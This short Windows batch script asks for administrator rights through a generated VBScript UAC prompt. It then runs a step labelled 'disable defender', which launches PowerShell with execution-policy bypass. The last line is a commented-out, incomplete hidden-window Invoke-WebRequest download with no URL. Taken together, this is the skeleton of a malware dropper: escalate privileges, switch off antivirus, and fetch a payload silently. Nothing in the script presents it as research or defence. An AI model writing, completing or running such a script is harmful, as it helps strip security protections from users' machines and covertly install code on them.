@REM Request administrative privileges for the script
@echo off
:: BatchGotAdmin
@REM -->Check for permision 
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    REM Administrative privileges not found. Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    REM Creating VBScript to request admin rights
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""%params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    REM Admin rights granted. Continuing execution...
    pushd "%CD%"
    CD /D "%~dp0"

REM disable defender
start powershell -ep bypass

@REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri "
